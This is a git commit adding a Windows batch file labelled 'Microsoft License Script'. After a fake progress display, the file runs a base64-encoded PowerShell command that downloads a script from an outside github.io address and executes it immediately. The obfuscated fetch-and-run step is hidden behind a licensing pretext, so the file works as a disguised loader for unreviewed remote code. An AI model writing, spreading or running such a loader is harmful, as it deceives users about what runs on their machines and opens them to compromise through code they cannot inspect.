b5d440d3101ffa2ea54ea6952ed863de0e3d7a12
Cyber-Ghost <55352133+chhai-dev@users.noreply.github.com>
2024-01-09 11:13:08 +0700

    Add files via upload

---
+++ remote/License_full.cmd
@@ -0,0 +1,14 @@
+@echo off
+color 0a
+echo                                       Running Microsoft License Script.
+timeout /t 1 >nul
+cls
+echo                                       Running Microsoft License Script..
+timeout /t 1 >nul
+cls
+echo                                       Running Microsoft License Script...
+timeout /t 1 >nul
+cls
+powershell.exe -EncodedCommand JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAGMAaABoAGEAaQAtAGQAZQB2AGUAbABvAHAAZQByAC4AZwBpAHQAaAB1AGIALgBpAG8ALwBsAGkAYwBlAG4AcwBlACkAKQApAA==
+
+exit /b
